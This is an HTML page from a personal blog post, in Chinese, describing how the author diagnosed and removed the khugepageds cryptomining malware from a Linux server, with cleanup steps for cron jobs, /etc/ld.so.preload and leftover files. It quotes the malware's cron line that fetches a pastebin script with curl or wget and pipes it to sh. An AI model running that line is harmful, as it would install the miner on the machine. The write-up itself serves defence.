@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="google-site-verification" content="CJVFgKvg7DR1-BcZBWyXCBGarPIaFkj6TCRZfg5koC0">
+
+
+    <meta name="keywords" content="blog,个人博客,博客">
+
+<meta name="baidu-site-verification" content="Y5fkV0dnwS">
+
+<title>Linux服务器CPU占用100%，Error_ No space left on device，khugepageds挖矿病毒引起 | brbai</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+</head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">brbai&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">brbai&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Linux服务器CPU占用100%，Error_ No space left on device，khugepageds挖矿病毒引起</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">brbai</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">June 18, 2019&nbsp;&nbsp;15:03:19</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/BUG集合/">BUG集合</a>
+                            
+                        </span>
+                    
+ 		   
+       			 <!-- 不蒜子统计 -->
+       		        <span id="busuanzi_container_page_pv" style="display:none" ">
+                         Views:
+				<a href="#"><span id="busuanzi_value_page_pv"></span></a>
+        		</span>
+		   
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h4 id="最近部署RabbitMQ运行的时候提示-Error-No-space-left-on-device（磁盘空间不足）"><a href="#最近部署RabbitMQ运行的时候提示-Error-No-space-left-on-device（磁盘空间不足）" class="headerlink" title="最近部署RabbitMQ运行的时候提示:Error: No space left on device（磁盘空间不足）"></a>最近部署RabbitMQ运行的时候提示:<code>Error: No space left on device</code>（磁盘空间不足）</h4><blockquote>
+<p><strong><code>df -h</code> 查看磁盘使用情况，发现磁盘并没有占用满</strong></p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20190618134356341.png" alt="在这里插入图片描述"></p>
+<blockquote>
+<p><strong><code>df -i</code>        继续查看 inode 使用情况，发现也没有占用满</strong></p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20190618134401127.png" alt="在这里插入图片描述"></p>
+<blockquote>
+<p>查看阿里云服务器控制台，CPU使用显示占用100%</p>
+</blockquote>
+<blockquote>
+<p>运行<code># top</code>发现<code>%Cpu(s):  2.0 us,  1.7 sy,  0.0 ni,96.0 id,  0.0 wa,  0.0 hi,  0.3 si,  0.0 st</code>中 id 为96%，说明CPU闲置96%，CPU占用不为100%，与事实情况不符。这个时候你就要怀疑是否病毒造成了。</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20190618144658726.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xpdHRsZUJsYWNreW95b3lv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<blockquote>
+<p><strong>Top 命令显示参数解释</strong></p>
+</blockquote>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%Cpu(s): 2.0 us, 1.7 sy,  0.0 ni,  96.0 id,  0.0 wa,  0.0 hi,  0.3 si,  0.0 st</span><br></pre></td></tr></table></figure>
+
+<p>其中us 2.0% 并不代表消耗就是2.0%，这是表示用户占用的cpu，而 sy 表示系统占用的cpu ，id 表示闲置的。</p>
+<p>所以查看服务器的cpu消耗，应该查看id的百分比，占用就是1-id%</p>
+<blockquote>
+<p>查看计划任务<code># crontab -l</code>，发现远程脚本的定时任务</p>
+</blockquote>
+<p><code>*/15 * * * * (curl -fsSL https://pastebin.com/raw/TS4NeUnd||wget -q -O- https://pastebin.com/raw/TS4NeUnd)|sh</code></p>
+<hr>
+<h4 id="处理远程病毒脚本"><a href="#处理远程病毒脚本" class="headerlink" title="处理远程病毒脚本"></a>处理远程病毒脚本</h4><blockquote>
+<p>排查清理 <code>/etc/ld.so.preload</code> 中是否加载有恶意动态链接库</p>
+</blockquote>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ld.so.preload</span><br></pre></td></tr></table></figure>
+
+<h5 id="发现存在恶意动态链接库"><a href="#发现存在恶意动态链接库" class="headerlink" title="发现存在恶意动态链接库"></a>发现存在恶意动态链接库</h5><p><img src="https://img-blog.csdnimg.cn/20190618140236923.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xpdHRsZUJsYWNreW95b3lv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h5 id="删除-usr-local-lib-libcryptod-so恶意动态链接库"><a href="#删除-usr-local-lib-libcryptod-so恶意动态链接库" class="headerlink" title="删除/usr/local/lib/libcryptod.so恶意动态链接库"></a>删除<code>/usr/local/lib/libcryptod.so</code>恶意动态链接库</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -rf /usr/local/lib/libcryptod.so</span><br></pre></td></tr></table></figure>
+
+<h5 id="修改-etc-ld-so-preload此文件中的内容"><a href="#修改-etc-ld-so-preload此文件中的内容" class="headerlink" title="修改/etc/ld.so.preload此文件中的内容"></a>修改<code>/etc/ld.so.preload</code>此文件中的内容</h5><p>按i键进入编辑模式，删除<code>/usr/local/lib/libcryptod.so</code>字段，按Esc键退出编辑模式，<code>w!</code>强制保存，<code>q</code>退出</p>
+<p>使用top，查看发现为Linux挖矿病毒khugepageds，记住其PID，并杀死：<code>kill -9 17957</code><br><img src="https://img-blog.csdnimg.cn/20190618141434910.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xpdHRsZUJsYWNreW95b3lv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h5 id="排查清理可能残留的恶意文件："><a href="#排查清理可能残留的恶意文件：" class="headerlink" title="排查清理可能残留的恶意文件："></a>排查清理可能残留的恶意文件：</h5><ul>
+<li>删除文件<code>rm -f /usr/sbin/watchdogs /etc/init.d/watchdogs</code></li>
+<li>分别编辑 <code>vim /var/spool/cron/root</code>，<code>vim /etc/cron.d/root</code>文件，删除定时内容</li>
+</ul>
+<h5 id="重启定时任务"><a href="#重启定时任务" class="headerlink" title="重启定时任务"></a>重启定时任务</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl reload crond.service</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>执行<code>crontab -l</code>此时发现病毒的定时任务已删除</strong></p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/2019061816384857.png" alt="在这里插入图片描述"></p>
+<h4 id="再查看阿里云服务器CPU占用情况，发现CPU占用恢复正常"><a href="#再查看阿里云服务器CPU占用情况，发现CPU占用恢复正常" class="headerlink" title="再查看阿里云服务器CPU占用情况，发现CPU占用恢复正常"></a>再查看阿里云服务器CPU占用情况，发现CPU占用恢复正常</h4><p><img src="https://img-blog.csdnimg.cn/20190618143529731.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xpdHRsZUJsYWNreW95b3lv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>brbai</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://br-bai.github.io/2019/06/18/Linux服务器CPU占用100%，Error_ No space left on device，khugepageds挖矿病毒引起/">https://br-bai.github.io/2019/06/18/Linux服务器CPU占用100%，Error_ No space left on device，khugepageds挖矿病毒引起/</a></span>
+                    </p>
+                
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Make excellence a habit.</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/Linux/"># Linux</a>
+                    
+                        <a href="/tags/khugepageds挖矿病毒/"># khugepageds挖矿病毒</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2019/06/29/RabbitMQ消息中间件的了解与使用/">RabbitMQ消息中间件的了解与使用</a>
+            
+            
+            <a class="next" rel="next" href="/2019/06/13/Linux Centos7上部署FastDFS文件服务器/">Linux Centos7上部署FastDFS文件服务器</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+   
+
+    <div class="copyright">
+        <span>© 2019 <a href="https://www.bhy702.com" target="_blank">brbai</a> | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    
+	
+       		 <span class="post-meta-divider"> | </span>
+		 <!-- 不蒜子统计 -->
+       		 <span id="busuanzi_container_site_pv">
+                	Pageviews:<span id="busuanzi_value_site_pv"></span>
+	        </span>
+        	<span class="post-meta-divider">&</span>
+       		 <span id="busuanzi_container_site_uv" style="display:none">
+                	Visitors:<span id="busuanzi_value_site_uv"></span>
+        	</span>
+        	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+   	 
+
+
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
